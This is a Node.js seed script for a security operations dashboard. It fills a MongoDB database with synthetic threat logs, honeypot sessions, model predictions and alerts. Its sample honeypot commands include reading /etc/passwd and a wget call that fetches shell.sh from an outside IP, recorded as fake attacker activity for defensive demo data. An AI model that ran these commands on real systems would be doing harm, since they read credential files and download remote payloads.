require('dotenv').config()

const isBlocked =
  process.env.ALLOW_MOCK_SEED === 'false' ||
  (process.env.NODE_ENV === 'production' && process.env.ALLOW_MOCK_SEED !== 'true' && !process.argv.includes('--force'))
if (isBlocked) {
  console.warn('\n[BLOCKED] Synthetic database seeding is disabled in production without explicit confirmation.')
  console.warn(
    'To explicitly seed fake/demo data, run: npm run seed -- --force --confirm=<database-name> or set ALLOW_MOCK_SEED=true\n'
  )
  process.exit(0)
}

const mongoose = require('mongoose')
const { v4: uuidv4 } = require('uuid')
const bcrypt = require('bcryptjs')
const User = require('../models/User')
const ThreatLog = require('../models/ThreatLog')
const HoneypotSession = require('../models/HoneypotSession')
const Alert = require('../models/Alert')
const AIPrediction = require('../models/AIPrediction')
const BlockedIP = require('../models/BlockedIP')
const Campaign = require('../models/Campaign')
const { redactCapturedCredentials } = require('./redact')
const MONGO_URI = process.env.MONGO_URI || 'mongodb://localhost:27017/sentinel-db'
require('./destructiveGuard').requireDatabaseConfirmation(MONGO_URI, 'seed', [
  'users',
  'threatlogs',
  'honeypotsessions',
  'alerts',
  'aipredictions',
  'blockedips',
  'campaigns',
])
const USERS = []
if (process.env.ADMIN_INITIAL_PASSWORD && process.env.ADMIN_INITIAL_PASSWORD.trim()) {
  USERS.push({
    name: process.env.ADMIN_NAME || 'Admin User',
    email: (process.env.ADMIN_EMAIL || 'admin@sentinel.io').toLowerCase().trim(),
    password: process.env.ADMIN_INITIAL_PASSWORD.trim(),
    role: 'admin',
    department: process.env.ADMIN_DEPARTMENT || 'SOC',
  })
}
if (process.env.DEMO_USER_PASSWORD && process.env.DEMO_USER_PASSWORD.trim()) {
  const p = process.env.DEMO_USER_PASSWORD.trim()
  USERS.push(
    { name: 'Arjun Sharma', email: 'arjun@sentinel.io', password: p, role: 'analyst', department: 'SOC' },
    { name: 'Priya Krishnan', email: 'priya@sentinel.io', password: p, role: 'analyst', department: 'SOC' },
    { name: 'Sara Mehta', email: 'sara@sentinel.io', password: p, role: 'viewer', department: 'SOC' }
  )
}
const ATK = [
  { ip: '185.220.101.47', country: 'Germany' },
  { ip: '45.95.147.22', country: 'Russia' },
  { ip: '194.165.16.78', country: 'Netherlands' },
  { ip: '212.102.39.212', country: 'Ukraine' },
  { ip: '77.247.110.50', country: 'USA' },
  { ip: '91.92.252.10', country: 'China' },
]
const TYPES = [
  { type: 'SSH Brute Force', sev: 'CRITICAL', r: [0.88, 0.99] },
  { type: 'SQL Injection', sev: 'HIGH', r: [0.7, 0.9] },
  { type: 'Port Scan', sev: 'MEDIUM', r: [0.5, 0.75] },
  { type: 'DDoS', sev: 'HIGH', r: [0.72, 0.95] },
  { type: 'RCE Attempt', sev: 'CRITICAL', r: [0.85, 0.99] },
  { type: 'Malware Beacon', sev: 'HIGH', r: [0.68, 0.88] },
  { type: 'XSS Attempt', sev: 'MEDIUM', r: [0.45, 0.7] },
  { type: 'Credential Stuffing', sev: 'HIGH', r: [0.65, 0.85] },
]
const SVCS = ['AUTH-SRV-01', 'WEB-SRV-03', 'DB-PROD-01', 'GATEWAY-01', 'ENDPOINT-14']
const NODES = [
  { name: 'SSH-COWRIE-01', protocol: 'SSH' },
  { name: 'HTTP-LURE-02', protocol: 'HTTP' },
  { name: 'FTP-TRAP-03', protocol: 'FTP' },
  { name: 'SMTP-DECOY-04', protocol: 'SMTP' },
]
const CMDS = [
  { command: 'uname -a', output: 'Linux ubuntu 5.15.0', success: true },
  { command: 'id', output: 'uid=0(root)', success: true },
  { command: 'cat /etc/passwd', output: 'root:x:0:0', success: true },
  { command: 'wget http://45.95.147.22/shell.sh', output: 'Connecting...', success: true },
  { command: 'ls -la /root', output: 'total 28', success: true },
]
const rand = (a) => a[Math.floor(Math.random() * a.length)]
const randF = (a, b) => Math.random() * (b - a) + a
const randI = (a, b) => Math.floor(randF(a, b))
const ts = (d = 7) => new Date(Date.now() - Math.random() * d * 86400000)
async function seed() {
  await mongoose.connect(MONGO_URI)
  console.log('Connected')
  await Promise.all(
    [User, ThreatLog, HoneypotSession, Alert, AIPrediction, BlockedIP, Campaign].map((M) => M.deleteMany({}))
  )
  console.log('Cleared')
  const hashedUsers = await Promise.all(USERS.map(async (u) => ({ ...u, password: await bcrypt.hash(u.password, 12) })))
  const users = await User.insertMany(hashedUsers)
  console.log('Users: ' + users.length)
  const tDocs = Array.from({ length: 150 }, () => {
    const a = rand(TYPES)
    const attk = rand(ATK)
    const score = parseFloat(randF(...a.r).toFixed(3))
    const created = ts(7)
    return {
      severity: a.sev,
      sourceIP: attk.ip,
      targetService: rand(SVCS),
      attackType: a.type,
      aiScore: score,
      confidence: parseFloat(Math.min(score + randF(-0.03, 0.05), 1).toFixed(3)),
      status: score >= 0.92 ? 'BLOCKED' : score >= 0.7 ? 'MONITORING' : 'DETECTED',
      autonomousAction: {
        taken: score >= 0.92,
        actionType: score >= 0.92 ? 'IP_BLOCKED' : null,
        actionTime: score >= 0.92 ? created : null,
      },
      geoLocation: { country: attk.country, city: 'Unknown' },
      createdAt: created,
      updatedAt: created,
    }
  })
  const threats = await ThreatLog.insertMany(tDocs)
  console.log('Threats: ' + threats.length)
  const sDocs = Array.from({ length: 40 }, (_, i) => {
    const attk = rand(ATK)
    const node = rand(NODES)
    const nCmds = randI(1, 10)
    const cmds = Array.from({ length: nCmds }, () => ({ ...rand(CMDS), timestamp: ts(3) }))
    const start = ts(3)
    const dur = randI(20, 600)
    const files = cmds.some((c) => c.command.includes('/etc/passwd')) ? ['/etc/passwd'] : []
    return {
      // demo- prefix: retention, the dashboard's DEMO badge and the Q-learner all treat these as synthetic (L5).
      sessionId: 'demo-seed-' + uuidv4().split('-')[0],
      sourceIP: attk.ip,
      sourcePort: randI(49152, 65535),
      honeypotNode: node.name,
      protocol: node.protocol,
      geoLocation: { country: attk.country, countryCode: 'XX' },
      credentials: redactCapturedCredentials([{ username: 'root', password: '123456', success: false }]),
      commands: cmds,
      startTime: start,
      endTime: new Date(start.getTime() + dur * 1000),
      durationSeconds: dur,
      filesAccessed: files,
      malwareDownloaded: [],
      iocExtracted: { ips: [], urls: [], hashes: [] },
      deceptionScore: Math.min(100, nCmds * 3 + files.length * 10),
      engagementLevel: nCmds >= 6 ? 'high' : nCmds >= 3 ? 'medium' : 'low',
      status: 'closed',
      linkedThreatLog: threats[i % threats.length]._id,
      createdAt: start,
    }
  })
  const sessions = await HoneypotSession.insertMany(sDocs)
  console.log('Sessions: ' + sessions.length)
  const classes = ['SSH Brute Force', 'SQL Injection', 'DDoS', 'Port Scan', 'Malware Beacon', 'BENIGN']
  const pDocs = Array.from({ length: 80 }, (_, i) => {
    const cls = rand(classes)
    const attk = rand(ATK)
    const score = cls === 'BENIGN' ? parseFloat(randF(0.01, 0.25).toFixed(3)) : parseFloat(randF(0.55, 0.99).toFixed(3))
    const created = ts(7)
    return {
      inputSource: rand(['network_traffic', 'honeypot_log', 'system_log']),
      sourceIP: attk.ip,
      predictedClass: cls,
      classProbabilities: { [cls]: score, BENIGN: parseFloat((1 - score).toFixed(3)) },
      threatScore: score,
      modelVersion: 'rf_classifier_v2.1',
      modelType: 'random_forest',
      isAnomaly: score > 0.75,
      anomalyScore: parseFloat(randF(-0.8, 0.3).toFixed(3)),
      inferenceTimeMs: parseFloat(randF(12, 85).toFixed(1)),
      verified: Math.random() > 0.6,
      actualClass: cls,
      generatedThreat: score >= 0.7 ? threats[i % threats.length]._id : null,
      createdAt: created,
    }
  })
  const preds = await AIPrediction.insertMany(pDocs)
  console.log('Predictions: ' + preds.length)
  const aDocs = []
  threats
    .filter((t) => t.severity === 'CRITICAL')
    .slice(0, 12)
    .forEach((t) =>
      aDocs.push({
        title: 'Critical: ' + t.attackType,
        message: t.attackType + ' from ' + t.sourceIP + '. Score: ' + Math.round(t.aiScore * 100) + '%',
        severity: 'CRITICAL',
        type: 'THREAT_DETECTED',
        sourceRef: { refModel: 'ThreatLog', refId: t._id },
        isRead: Math.random() > 0.5,
        targetRoles: ['admin', 'analyst'],
        createdAt: t.createdAt,
      })
    )
  sessions.slice(0, 10).forEach((s) =>
    aDocs.push({
      title: 'Honeypot: ' + s.honeypotNode,
      message: s.sourceIP + ' - ' + s.commands.length + ' commands',
      severity: 'HIGH',
      type: 'HONEYPOT_SESSION',
      sourceRef: { refModel: 'HoneypotSession', refId: s._id },
      isRead: Math.random() > 0.5,
      targetRoles: ['admin', 'analyst'],
      createdAt: s.createdAt,
    })
  )
  const alerts = await Alert.insertMany(aDocs)
  console.log('Alerts: ' + alerts.length)
  console.log('\n=== Seeding Complete ===')
  console.log('User accounts provisioned: ' + users.length)
  process.exit(0)
}
seed().catch((err) => {
  console.error(err)
  process.exit(1)
})
